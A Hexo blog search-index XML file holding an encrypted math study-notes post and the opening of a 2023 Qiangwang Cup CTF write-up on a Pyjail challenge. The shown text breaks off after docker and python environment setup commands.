<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>高数笔记</title>
    <link href="/2024/02/28/%E9%AB%98%E6%95%B0/"/>
    <url>/2024/02/28/%E9%AB%98%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="e929a02d03e3ac54d337cdbb09fbb0afb8b965f01db564068bf9e33c1ec005c7">3c7b49972398798ff56b3ee1d5c7cebf0243040549ad41d0a4f857629952e498807f5ae06395b88290f3b43ef9954e2dcd4d7e386e4e361c5b2184b2d2fc7c578a8ebd77ef3891a9b360585842a4e2826136e75eca7059cdea4227196386be6c38d1011651e5488352ba66201a0c0ed4076154c8e1b79fcabd94eeb4e6836aadea7cb4a3e02ef48f0e97f3456b4264801fc4ce47338572c9e316e55e038a7dc133bf942df4ee8dde2a5dfbcaf7dd9af88ba854e7bfac69c610267e5ddf288cabd1fba9b1d7073f93f3652711d3906e1e3d6d78638982819e6fd7402376fb5b529c0908625dd71d8e63db31273174fcdcc2db528c533f7766e8bc89e545fb01439b9195e4151512a1b36b556dd84ce859b0a602e2859328055369a97994ff2b49ec522d2e92c49bea72c8c606ecab8b18ad24b8fb5be1305dbfaa6dae50de2456d092ce7d27200720bb2c9ad2bc3f8ee5d0a3eefa24b508478f6fa275f9dbbf6df0dbbdc413cf173b5849caff5325f6d15b83ea70d2aad0a1ed34014d5c491ddaafed447607c419918d4936bdeedb997ec193b17047fa4238cd0254fd42e63c8e545d8870482d20bf88d56c7ac72d7146a9e7647c57aaa2f0e95bb8475f2bed9dcbfb24c9573e91cd32e36f0853b6f42f8c79da92708892d005db475ab4774b244a6217db0af249c8b35051974bdd0f6a246f202e7189c374bd21a42a019929343129be80dabb24350519052ebf2713eeba7f731b7305c2e5a17b74063f399e7d04d39a936ad5db93224fda6c713320c6cfb2b351f4526ba3ed3a0bf3254a609b39a140fe27dff4cf4ef0540736c7f62eb71ff950facd47349ca5b6bcfcbe1561f50f6322cb3f77ee8aadeaadd84d0200dfb6913c84740b433633b824a62cf846c6a04df4adcaab44ce5b9eee5bc568c30f9c58777744fd426bfdceab827b919e25306e31b0586b68219d4c9d68835d0f329b8d14c99a4d9e3d5845760045e7216f43b2a8fe9868ca52d8dff0d321e2def6c99d0621ffb065d861c13a6acad5ee90c1be622063e319d5c625ab5381e9a3d5158c494d9b8d5865e05c8130e058db26f9011cee21064e612402d3bfc2e022267aea1a7698bfd930fb9984ca40f505782f0d40c44e48853eadf93f7d2954add334e8d0e4e45ecd8ef5e85eaf707472483bd83c27ad4f3ef586a794b41d46c943d2c172b650994864971171993159ba344c3adcbe344385c578a3d008cd56fee4231a0f40788694aa1a13f2a2c6bf89f2da873f7c08d5f8775b7480a73038dd978519f9b05582236cbcf9ac72c8b5b632c2632d9575f885319002bb9086208c5e04d6372aae6aeb6f4f87366924a01d1b8c5804e3d1131320c717f14346f07f5b4890b5706758d1cbaee2e126bdc92de83f4e4f657595238acd4c4041bc17d52f31356dfee07d9dcca2a3cd3b38db63a069c66f589a9fbc8b0f48133965eb9803f385f0a2df7362a29d48a8824e114ea7cf51b8f71b1ebb83e63b6cd6a955fb9f90bb0bcc2598ccaf90462ff6b37211db364ce06a488a13ee15c6b007ee127d2f85de771bd536879965edb03c5f62c734d0d778ff14f32ebae33e8f21fea7fc8d8e2464c2fb7ae73569762643ea49a6652d948a8671220b5149e533ac081dcd1778b45be79c6883d8e11ac5dfcc23a21efd33950fa30fa1cba5bd2bd67f4172230f861e78e953d3d7dbffe40b47cac6cd2b9bacabf6068f253d54c70c49af9184db72bf3241416436fab46768c28803594b31f468653274f468dd2303f894edaf03ac11422dabf9d7bda154e40636f26253e7b7cb6a3eb7f07c9df3e8eddde73f0fcb6e7f9261f1dafeae92c302eb61dbab81c79992eda8271116370c68e259d565866a3c189ee3b48d409c6994f719025b802c6c6e595dbceac51decab340348ca1a96b8d84e498780ca6be45d53309bd80c855c168e3c083f954c6039d75065ab582a06f6bbd5a47629045390809fd6023f8b47892ac7c59731ba3a947657882f5cddf390f750bc0a9a5e54da417664f2d69ae5b12d754bfa15b1e0145612474cd283fd487858f5e1933083f61838cabad6c317f55f6f73a947901889b0aaaa13650c0e992db77d6be7979dbf8c46e560c79b26184ad716db5e9cdaed088689efe9f04c947933bd9a089752986b52662e0a291dfa367034233df2f1428a15a2b412db8d756c659e8e9c2c94d68f1337cdd5a2274fff2bcfa56bc3bfb2b67aa9f2a8d120ab00d4bb50a9fcc0db650908ccb72370c1cd9d6aa511bb51946c22981ddb52e9e3205cef4b832290f02bf26a71de25358eec631a27861df78fd5841f3aab45748cc5c802f304e20639a7f79bd3c44ae9f271d6e381a8809d3abcae410cd41959fbeba26e27447a5e4ae28e20f447ec4d225e5b19294fc85f4f2ba9faa1abe8359b31f78e6bfe93c905ec5ca74292f6e62615d0b37ef9982c6ee4bebbbf14321ffc6645213c01c8a9227464458980ddd7524686a40b76823bc39af0d98f3e0a4f3227867420934311d9e65ebc710080aaf1b44332bfda687367b6e9e3e3e320d598b73023e704987de72b8128af50ef81c3732a39c7e32c1633413d93a6ad9d373cdb187fff1388938e18520003215e202867fed3972392be00820d168dea61b1054be68f7c27c5b4d928ee7dd0c6e9708a755cadab53534d1023a0002124b78ec47e4e41509e6135f4f75bc94711196beef69079f9b3f896aee422b8335dd00a812e965d611ca964c65f8bd129b2ebee2f9d27991ece900121b79612c5189519807fc25fac5be07369be244379bfdb4d4bb5b386f3cf18e63a855f278395440d0e8246964acc9c800580270c765c9c99b765fe967955e1732a6e905727119ecf623578c8c03d3140fcd7e698b3abc52923b8e1d3fce50288a90bcf2cf504780ea2af565f7d8dbaab365d81c400eb0923b8918f9106dd32e55e296f3c5df79ec50e67bbbdff0417202e6ba905b964ba489c53b91213ab08f16ee4b7f7f1f6c2c62edc20a31e6a6c8012317c725f16097c5099e4e7bb6cf0b59127d8c0ace8e320f8e74fd141cb4ba5758e229a6c46877b6967db4fadc16d5ef5df10f8200b3cff490105ac7f5df845e92bf2e69e3c3921d02c2b5010d2ff144a3068ff6a0ce8180ab80731c38b53a65db855bc056d6a46b986a956ec3461934684875435d2d7abe6eb120d6072c8a4f7ca10d0a94f6fc31c052a4e48f9e474198445dd5c0a7f7ed73044d14cc9b24042d7ad6e49867a6fcd10926c5f859079dc627e3d56b1d0dc41185338a55514a4ef86b0bb6a172c7cc4449c31dd40fe7aef6d8bfe62b20cc30909e74deb50f72c96e9dddd9e5a934e9b627c30d865b3d419ccd5476ebd2dbee53c2f2f33398f89c38dad290db91ddb817af5a8a00a8656636a9b0824cc7e2ad0f761c18c6acf66713b470f686749653de8220dfa8118daeb7db6f2e5fe124c2588311ea69fc924caca5af3be8aaa4aaa4d62a047d487e74c67e1fdd5e8e0b7661df3a2c28c9d9cd0cb1a13a4d9415475f30e6103ddbe1a358ba1c76b47a285d2dcf5890cf7c6f0c7346cc8825ed7898bfd8fb3f4724da8a626e02b8c4c4efbf8dcf6dba2fdd912b8835455fbb24da91ef08207ca2476423c7baf715358c82cdcdf84eac4d02f9067fa94289c07695f23ee4e50d86538729e3abd7c4d8a5fc3083c5a640944ea9638f9247c9e4154676099ea6b8f267bfb3dc22c465b45a2be61887215cbc4309d7910c622ff4cd792902100c3b810891c8e26c33711ed50c7d0a31ea5d1f3b6da13a864b1f6027e9cfc3abf61088ac5956a83e7b43d806cd82fafd12bf79ecd4b4a0c2f269d6788a13840f9be2c0ab4d2a0f06ef8856aa954d8cadebca2adb8e3428fcfa06210bb904c5105415fc10560f1ebe1e4031ed0297d07fe7cb79e56c774988e82433205bb86995dc933cbf3fce18de563976b7e37beca6619c18d732090483afacadd50dae0fa7e515278e8ec9c7ce1e14153e0fc805d9d8e898e025697a1a09bf89039e595bada37351c725c79e52800fca8ddf94f4d98c6e1811fec6ccb93edc075a68b7b8b899906becc3135a13b2558ae0526d493aa6be9d7326441fc627a2a9b469b126ef36fd2e92bf6cb1f54afc6d40b50943041087bd8a28db677094d2eeefba2f04624406ae5abb718c1d623220ba68ee007421ffed67be9e8d3f89073d6953d9c5d803aab36d37664d29650a1b7e842d2cb4038e740118a0ffcd079bfe2f2c90f90f4093989953f7cbc94b751b3701e33121f60153c8148d245458a91f569a6b02ea6798c08e412729dc02ec62abf063cc7cfcdf0690961449917f7ea8cb4cbebe9893e4a70c9debdf7e6c44c6950b01cb46346021bf180b9968c5904e9fe845f37c471bfa16cfe38db1252cb3a0f096f36655da77d6282a23fc8b45072d487802c301b2642b0f4e37c72cfee57fc9bd8b1067b8528cb19aacc29594c007c3269af904a138dd7ae72791287a170aeb4dfbd32031f5770f2d5a38fb9896ee90f9926f02bd0f70f649289683cf4ffda7430a80fe063b6c39c2209788219df8ec3f21a28c3eebe5410a0303cd3c6e1f98499f0439f52cc777abc0de8117fdc60b40f3d6e3f78b5b01aef7a29eaeb852b8ebcb0e1ebd8b68b1db5ad428e79b4ebffbf64a0c04cdccb48823227ae03dd5388aece06a4a39c483ddc7a342b050e59bb6d2ea7a56e53b9afefe549b8184a0c9c35be39a032093404edd1e79a9bf2d1a59e327f7679cc882b4664e42ad546817a9daedec7b84033a8a5cb32842f7e9cc5a1113be47b7e1e817242cbe4e59f5cbaa0101b884618b23ac7c7c463cc309efaf891d2748a09b43a7cf117b5ad102928ba2e32ff80678014a24d3402f64ca096d3a3f7ba63fd7711ae5a0d628103deafdf0d336cc0dcf596162ba5aaee66ff02334811ef3fb7948d234f49de7584d5b21722c9cb3885c5d6e64733929138b6b74a4913b4c202f7eb60df67dded0b265c5e269d9cbf4b98007516acfc08d1f44ac513b4a708b9edadc1604020a1c0e045e96e279b81f13d10b26c52dfe876e4ba9b9656271ab260291654f0fd114b6ff561cbed3f7211028b9eacd951a591badeab1769091582e0241b4a49498d7ddbca29e5da787bf823b113479b57ce69c61cc86e1806034e6e342c8a16c71f2726b2f14ca58e40105babefe27076ba9501b41a3e5bd6a5db0b4fd32d11dad982d7064553f4775368f9c81615f35c8cc53418e8f59b119a211f1f1543f21120dd4118e060d965713d1d4811f4d37e3ffa5c1bafd902542a4a36baee3b910e6e75615fedaf4f09597406d519c7e9c4a182a8eadc7ecbcbcb86f2c8a37695e4a322b1bc6b2c814e53d63a715b1c886ca1c38936800b06b8fa079b21e0087558e9f704ee178cdd2622d6933de99e1c08642b697a7515c40c2dd928a7aae27d810af31bda72b5253a572cba22f988b7f13e6c0f4be14f43eca72c39ea4d98709dba5e662e0c9fb825dc04aa31388525a0481e4efdc6a1cfd69c5b499c29cf4ca502d6e7f5c4d9df82e7567e1faed00d7e88077ee1c70d533cdb8932835fb1432a8ff13e388e68f0e9455527959884e8342fb57a0ac977a9985f0294395c65376aa33d02b8fd526f2016de946e83e09789b00a4ee3587bf134df8b04c39026f433d789951d847eb4f41023744af08735d3d291e63db000a8eea035b909a29a6ca74ac9c67850f269da9a16f052627c1804284a47f2cee9a671a2143a365fc2bf0c3dd368237d49541320cce0ecdc37e4b56a00b61bc26d7660e1189ad6b5c7821d75a3062207356a6ea17a84b69a6cb877260cc1d9cf4429965e27a9cd0c1016d69b471e4c6da202b74de836a471594986fcc107da5ea78a6112fe37312836c662615de79a1410c0e3537abd0d45c8c60f4efc4c5d373d726ed5ffba9602b03288ff51be1aef17bc47ce1b05f08ab60ae86538cf4a2de4ef99d822891bb7b52d9e43fe432cac724a23365ae62ae5f0d2c8e28e7029194fa2ecb3f945074769f72b304a90f9b754bb1e0462fcf14e27de55fe31bc57a6adf5f88e5a52ccf54e6f636d129e141324527b101ef0544c8585db02fd816e1b281991675de130b59b79e17a5c8f8b27abdb6cd4a1b7fa3525ada8b49bba4ad819394c20e57a77f48d656b73237308bea08e13ebd03e44bc41eb05766f4766db54aec7691c471c5b4cf0585e9148cd0c387df68552cec39c2173372cc8287a28870a7aed627a10e9e780dd028e5926fc4945b47049c64f26ac281421836dfa1c584cd65dcbc731818e339ff5e2275f31b7032248d667f8b3fe9bec933cb6e8b23113d6e165c6f0ed8d836aacc6398be03ce07219fc5047bd027d3166c43bb58aada572e7de154d2a92dc124da3a7cc9ab598a74ce3ce78e457af11927895abe18f6b33e2a696f9845f548d41897123eb4964c3c9c82be52f35b69124c33880e6c526d86a84155f78149500ec2f5dc4cbda2abfd6376eee0762cfd755f3a25d2e964a83589f577c237cd3b4780cab5c65e0cf1d00ea8d391e7a6e6959649a884b7e6a124629ad7fa2145687e9c6de60ce212bff4eac80c3e26f3bfa01effea8ef9a5a187b0583127c33d27bf906a373af5e9247a99a4aa2b4d5477125a2e9427db944786d8d0159b71284d373a58ee973954782fde38d08dc50aa136bb4c809ddb32a0fa59d35cd72e8d52d19bfa5d0be7445cca9fb8a74f5f867ed668dc75b2cb43eadb5d8a17d8cb82052bc0b5f36a1a34032192d2e97da56d4a005819dff8232bd4fe4617cf87b3d6d324a202fccd0c597c3edba3279916e13540a23b0521c71c33012ac171cd73271892d0c78a12724f55b591ad46ee6cf1c44bceaacaf0397bf2813aaeca3951d9977260180d64207444844051eeb5ef4e3255fb2545ed8c13e599c6d9d4fff7ce5d87aa1f2b67f25f86cfbc2d99a48c16cd04a42bb60067baea36ff489b0557b333b63b10cb3517539bfa02358cf547dadf0eb14ec2f040ad354853c74d917a56490e63d3f0535c5a8c9c9bdd06c793256734206ad3ca89d189d610c321ba3c08ef83872d3a8be1dbbcc81d68bbca79ba08dbf189d85c0c8056aa9d63eb89f63605a149ca6af1eeb900645c345cfef81bfe64f68ab70344a779119de309319571f3f338fd761b1e54e3ed8782c037e4a06f04c7e7b7b8a696f7132d79ab10048418a818a5f94ef540665bcc328f6ed84327c545450745d1c8ccf7a510e12f006cee5379b7974a3ba7329b4c8e8c45a789b8da410edc8536babbabcdfd8019120ac06f7a59e6c2567f3172af7a08569ccc0c71f2951fb5d0b6fdc7b05011a74dbbce06df207fb413beca964d853a7754a51fb1ad70142761d5244704f197518f76f884970a32056a618dda702b527a6dfa934031cc089674741a131183805a05479256ad06fffc5b4af4c2d136f1e36ff36a1dd2331cfa63ef2e83fb6715f6914ca74bd5ebdb6ed8f4513f3421ab3c55faf29d54977f735c67511001a7bd6f613d86b2908c812770b46c5852616daa2afd7853b9f75094f298a2913cbe4fd9e6e220f6d5075dd902b85f0e1e5908b624312a2816ad9b01dc45698f502788eebbb7facdf6cba0e3cb43e523c454c3fe096fc7f92db31752681d61ec0212ebe96c4010b3cb5e6eb7f1c651e66132ba2e09e85be91a255aa9c236db7ba852d73ad22b5c3ff35db9b4b53d318078878a2e02bcbe450b81b38630583780f752bf3d830b883fe1cec390d9e922a771a1b946c0ff407c1dc1424524d7244b9182235b3e7b667c5b57e18a181dccc8a11ed932c093dd96104db33dd54f0924748514fcebf5605eabe5162db8499fd42b1698f6b3bd90d6a0eba175e7a810bdf47a2274c78d994976542b3a5c90964e4d1174cac24ad9b7ffebd9cd66d4461802a92a3fd403b1dfa7bc14477dcbf1b2ea28354adb4df136053544c56675053d280d248b22a15ef55ad01c419d10efff015fefbf3390f027427b630c753628a1daa1697499795fe8fa59cd04b63d14c7ffd3a541839a9c450a1d2a6f0320b05bb7785ef9386794a45128ba45132f1b32ab797cc7ea094251bf58b30efc6ca3d5ab5da970cb2d46df516958ffe35608d7312d790a2c386a5395711df7db89dd6b3191d7f3850cc08c869cf9bfa48ec4759ae1c8151ca074d696c79de40e981171194c01e7fc8ec5fde1bf46e23b4f1530ffd2fb5453d0e6936d4aca9d5c24701c1c2764c4ed111d8db7128d8e60f6c1666f21bdf8f25b5508dea00a42d3fc897d30f0526a596e78ccfa37abe16d870505781af32890486cdde62c301eae51380d814659f2ee213b961248b9b0804dc1e1663ad632f126ceaccca0abc2632c6266f6fa77017577f3f964d4c332f67436cb8d9be18cb66de6fadaf8acd8f7ff98870d8529cd339af42ccf3766c707ef176387639b38a2653ebf20cca0ef22771dfb576b35869b25c562856a18ca2805a93f4e43a187728051b70de4907e62a68df610b1a5e89973f8a73aca8450019d1d1bad1ca2cd0ed70e1e87b2dad810a52b4e25575926466c50a39aba4e8a97907ff6e8ccf49cbc0d8645fb0df94f6c852cd6da84ada21b5cfda89935a0f7a3e2abf02a3f13d6b83761cf2c578f07770cc1d220f747e3245fc5e57562131b20237f21a224d6a71fea97bfddf9c49c78acf97fb0ce1be09feabc50df63a67d86813f2094dc1f6a81bd57d6f77a7a9819ae2f640ce5d18cf66f772f9ab8cdb66b1fb4833146295b3901f8041f480a3f2dab92a8f80bcbebc8ab8700d446334ccb5c9eda69be9a429f4aa1b21c6c4e9ea7c5a8934bcf83274a091eab6a338f34f8c29ee6689a7c0b5852e9ef343b0a58c0a0fb6d9301b5f067e4d671af3c0ae50e0344255658bcab0fdb898fefd16e7b0ec43270fbca92e800d01e2f862354b0a382d26df780b4690afd127002e385fa6f826627aa51ebddff720862f7af5cd625a05d909730be61abb1b65c11fd582df11b7a88e83088fa3d5cb4d2339e991a4df4c3ca04410d3c6b19901ddb2ca5d5d735a8c9455125653ee8c374e530608277aa413620929efa706cb3944247da4964044da2df51e5acab0ecb7f4eb11cdce9afa716e2468e7f7d33184d7a03f3c53e3e2ac5080c9bc7669ed8839625aed5cdde62f5309c43c7623b63b1d1b084ba9eefe0e02796dab00239ea9fbd04c034a5352101630c3a1a75ff8a74142ed2c3080f0e9f025cdd5e1917b26919cb3ef51fafabcb3e7a7f2321fe410d3e633264f2d53ee341cdcdcc7d865016b416fe55ccd39b8e227476ea397dab3f3aee7cb1a081e1eff619f042892b511e5e102b4c1ed4863c7fe1ea4d997f1cffacf4460cb642d4809d3eba46749bb4081206168b5b03a2b783b78179168243cbedf4941f26c120dd52e53708a6a9cf35f4c8e728070d42d0a1199b29a65c7fd58bd35d5878ed18fcd65ed39ab46416582d6fcf072cd3b69e5940bc8b3c422da9100b370069004edd779cf95ad554e0d5e246745547854675ac082d942b2117b076c381b08e3dda8ffa0fb5c19a7b851ab4d1ee404034e0ab8cc7ddab010b4f66a05f14871910ecbb67510495b14577bc46d5e6090f77a987ea889741c619a79ce067e2e89dfa77f1471940a4146e128bfbce6d3cd507d83af7dddcdf8756c4ca31241bf8ead57b9084e50fafcf5463baea38bba5162a9f2bbc462de9cb41334ff5efe88ab38c4fb903fdfb1a91ef4901fb4704a07f0ebdb47a2c1e36d56ea638c6cd8023f9c546743d13975369ad98f900ac351facdebab962e23319c984bb52a0df2ddf74c7b7b2626f40b2394808bfc1efb46579526b175eea1ff1ec6c6508e80ebb80f6b1a8adfd83d09d706996c7d073334fb159b655806bc0af5d2923f4ebafdcab48af11d5188821f8ce85f1fbb3696231cf03f1f089d5f1f1e1535c4e4c6f53a66a01c7704d967f5a25fccbbb4408c3a337acc602eb3d79514fa838f0e48400435a1c7cfda60f2d4f5f21e09faba610d2eb8154e81569f4693f3fe34dbcb49bc2a253ef5c6955b35827e93f715a6a075f6a0a609853a8d8eac440312ac17af1137fbdd61a4d7fc352f41ddbe7e8f0bcf4180e88fa4849a19ccd33ca03b6062894b054aea83ab2450a26e4295ffcba345e45b58873e5fbad6ded784d939b5d0922895824bf311f1567b105fcc36515540422df0f6af91b3949baef7abc7411c7d5b2373492eade08e75480abaffbdfbc559ebb8e2a1169d13b30628924ebe56861a2e01965fc6a39f1d113635df1d89753991d04707082d4cab40bdc0e0af6aaf4008a364c4dfe03866431627ceb34f87dee76896882451f194f562b116eda97e05654a22dfaadd75793d63afe6e8955c4a5fbfe2e237c266d55d52acf03115385c34e7e6fcff7cf77c14b4cb74b9c62267df90e2c846ed28306aa23dfe73054ebf55dce02b7d00523fb5ab8bd9ff70ebb010bf40a99c6bc142c694bd0adef1fccc873d10368ed9a0d48fbc29775393be501a316250157fb0364437769073a8396fca31854eaab56678bb1e8b46ddf40e04c987ebcbee4e9e8404a7754f22d9c77bc8f65ccaef01e4ef49784525a8358fe93ee8aafca87bd897334cd392ddeb6fa113c29cac16b2c571691fdf68a8eb28c5e17185f8774112654eaf660b90846d15ac3941e3f0198a56bbade53c538d1cd080952b0e37b691ddf826c9c81b7c48eb3580b4920e3620282203795f85596c532b39bb08df3c612c73d863bba673487e06ec8c372c33e01ef25e0f0b09b3c2e18509f5d4ffc8024c5e0d9207aaea955043bcb772bb4034c24511304b9faf970f681ff6aa8a6280e8dd1832679076c2b56fef2940ab5b6b9077ff6ac52b43f6f969219a82755e384af507ff669b05b2dec1a808a6d0bb6f6e6f4255b6d7f885d33bee9411ad684e1ea07cf072530504a1b60a2374f8c8f5632a68c0730483171266231ec5caf5366d58d8c1fa371e3221cb23fba959fb0df61b5a8a104d27b2dde58d73aa97a56dc508e598b7bd9488c96e5b476382f15a803837cc465bf24d0f859bf997d2721d2edb3c3b31913cee12164ca03c0f72ea0b229058b100fce473af114ab1837d8bfc960c86885c905c120b59f6b79133478e18c378bb3f00e9f20be8c31ab0f55cafab8389ff4222ad7bb5f2f36dcd5f0f4ddc693f2174baa8c5d904d86574a4bc512630b1837646b7c4cf5b2b5deb070ab23333929a36eda4d15e0618e6152f578c7738284a7d774c9439ddf8dc6c78b1f8026b2b7986f99c2400734e305203445df375105787bef078c82b491e7acc107ba89a215db757177bc9b634bda3e0dc8411e5f73b1ae1356c5d43c3402e2c3a631ff3dfa7f8f14b7232eaa858d5b42387f489638ff972a7e9fffae3ca23bf6d946b13efd810beda6dfa8adeedb9e8b7be746ce29dfd5028f54d9054554e8f1179431b79b177627e2f7e673d06f641ed5151a109bf9a0ac9f7b590ff2f85ee79f5d98a1462f7c704de08a2ae572cd0bdcd0b8fc6b5b3eb3b3859f5e31473dd6d8540311dae64e570da25931be17458a3f2918632a7131169b335e8edcccf530c08142d618a3439c574755a33731a707ad75e3b6f60a079241899d95fa1774d9a899911f7e0878d67b28e22454d55d466d59c80458a9799665b59326d27a06a16b728a7d8c5c7e19a8462ca6858e14ab2a9999098e3a14e96f1cb5b149670c58fa78270edd18ef1187ade18b648feb3ddd7def1066251b97ad780d1e1aa846d412716bb3857f402cd2e30b65644965903d60007ac330193c7da6062781435e6b84a4a8c4a0148990b4e5359de5186784023a228f287c1dad8103bd948fd4bb101e4eca879c023c0c00e66a4405054d47e4ecd90af16d5604bff4678195934430436e8e8ac2946bc536513ab67f8737c6baacaefff4a42a518c6b4abc7cb8a7bb4eaa6a53d7191e0bec659c34875892cda2c8ae32cb8afc17f2378656b9b5d77cf45834d8d3459d4aefaf3665e12a5bc03fe2cb9ed0b0ebcc86106caaa0a49f21d67fead3287037fc64f1465c50f1e555efbaa6c0c2dc022859f6a39a44cc489995c935dedbc0a70e3bb21d6a04af87bba45dec130a0c2568846c7f66c501d63e242757b64637f3a01c61ec19fd6076ceae3e91bc5e17b2c2786e605e15269e70a9819aa1928ec3d0814323a02cc0cd0a6796bfd527d84e0514c21639c88e206c174b9e4f418569e3ac8e2fb0df05c3c19a9878f3138a10b2188084de4c1fbc2da74535a71f6e2e53e6567087f053e0563d113d76bf931ab56b465cab78a018e5ff6e8fa4412245d6e9e234cb84727a983d73ceee91f86f5bf45160cad2933bcb2edc60ab31429f32f83bd254ba5a2ad0af567dabe4624369fab2f141fd3f050eb3f66056d6b91834c44d02c43b7ca7dcf2b2381c919fc533fcec092c2196c25f1914f852da9e7e9c0928035b38ab0ed4a876a7e93d733dc5446e4446a0d6ff6e52a7679c9b306c596731c311cc44446f4f6333449083bc5d179e194332e66321dfb6885e16a43460acc7dfaebc1913c4c00347254b0ac85d6e2f5856f59d170e532b309cac12d1271698d291eb62a73e25758488dfd921a92a6ac12af4ff016d4148cb1ed7528a3318a512e89e74ad29085ca0707bd7cfebab023e9b8173fbe1519fd3c89ace6ce4e49215996bb9ee8b4242ef24a02f1a6626d5cc644aeb40b5de0f455133c667728d3a76e7b54f9f97a8f832e37763630eeaf0ddb3a0a4bdd7a22e5082e590bd7ad65e430c037d8bb48bbf6711fd2ef409bc3d8ebfe5c8f0198a596be838e686b071792f850cf5def082ea572566b3c1f803192a8e1c23eb475876fb8a4b97ed5d3e3eb493ad65d27922286cc656cca10d4ae5cda3046476b1c389ca0dbb85dcbdd9ff5c5a34c712b7d62c8e89ce809ffd8cc809d01eb599c29fe65dd98e9ee73d33d8c14d484fe6234b5b06b3c1dc2cd38f595402b60dd42da0f53b4625f587112f4f094418cbc57f60ded02f5fe33527b5f9084cd14da6b030f1b838a9522185fe19bacb75fa742ebbbf09e1974318f548ba512087f6de00dd9af546f98a2c1d269b54979530f16314b1b5de2d763a2f5e131e264b8e1e49e3751550ee6327613dd5bafeb2b34feeb12da779c54c6f2c9101c5c80f5823594da5cdd22051959e948bfab9c4be9bcba3db05c9b4c8ba04db16b28bff6d703f224d085ca1f1a383f1e3bd1603f2396167b47557c145fdd3f0c5dc3d02b1cd046df47a7141e9761f837f8e0a54afd1bf011210b7f7c9d51d19b9dd41c79717b529e155d0eccfdf994412d756f650e89c866d2a2ef0be3efe7ef0c1ffbb28a35e5c7e747b58d227faa8f80eda9607b378e7df2189655438bb32d3cc1c5f8755a3cfa1ce86a2b90622c19d53f7469aee44bb599e7466d98810bdb398502a6f28a63707bae22d0a5dacf3e6b45c3d7c2658dd1963912fd1acd12a088bd18ad1e3abaa85b400ba6bcffbcf1beb7129871437dcfeafb66c4a5b306a21538db9f01169bbb662dedf952e125bc4ff7ecafdf88b2b5e3f72518e128835de167a4b1c7059e9b7d02d5308d6c58e922a9b4794cce510086f6ef2fabd103b0602b7fa114cd5bafab82b5ed81382c280e02d2e8dddbdb4d68d012659c4577952fe5be3604d0bab2287e99f338eb3221d2564c3397c648f3e884af847258a4d7c85e45d37db263b1f9ce339a7f4af93e7f9ba960d3e96c29dda95b499550da877929fe01e37e3c634d9ba6dfd942d00e4fe96e3e84e45bc57715042fd268841e89982be70b1b4a7ca1896a28123206657a8757b3cbeb38ac052c14024ded29eb56998ce8695a20595fedfbb4e2ac7d3fd97c4fdfcc925dc902416141c5fd40a7c3682c092c6cdade1877f60dc73b10e242f5f03fc5738d100d457e305689dfd630d4a62ac0e75ef05d5acf2a0dbb8620ae0feb22dfe80a251a4e3de9b047848f2d228783926c07968a65268790c88d3b634debd8d484295596ce540ac22387c2b08e5ac145f3a2c37bd39f0fb37a94ed020da784d11d10238a39e3187d8064e9e5670b16a07d3d916b0308236ea17cf58fc0bf842905bc90977079821183b2a862e0404f0c6a1af03fa7b12bca7aeea0da245c03f4fafac8079b6686afac16f19f992aac29b02668c8cbe71f083aa9e498eb1829552f3e6e8b3c0fc0945e36258381693e5b7fd0a4a6b9794b8d99c668ef1e072780d2b2cd8e58bfcbfdc3a3e43f58107ab332d6c49f28a87922d7149deea25d4e807cd83b9efecd3af933a08e9531bc480a6b3b431301</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">考研专用</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>考研</category>
      
    </categories>
    
    
    <tags>
      
      <tag>高数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023第七届强网杯</title>
    <link href="/2024/01/10/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <url>/2024/01/10/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯">2023强网杯</h1><p>考完期末了有空更一下wp</p><h1 id="misc">MISC</h1><h2 id="pyjail-its-myfilter">Pyjail ! It's myFILTER !!!</h2><p>环境搭建</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker pull <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><br>docker run -it -v /mnt/c/<span class="hljs-title class_">Users</span>/ddd/<span class="hljs-title class_">Desktop</span>/<span class="hljs-number">2023</span>qwb/misc/<span class="hljs-symbol">myFILTER:</span>/pyjail <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cd pyjail/</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># apt update</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># apt install python3</span><br>root<span class="hljs-variable">@61c25569e99f</span><span class="hljs-symbol">:/pyjail</span><span class="hljs-comment"># export FLAG=&quot;flag&#123;testflag&#125;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 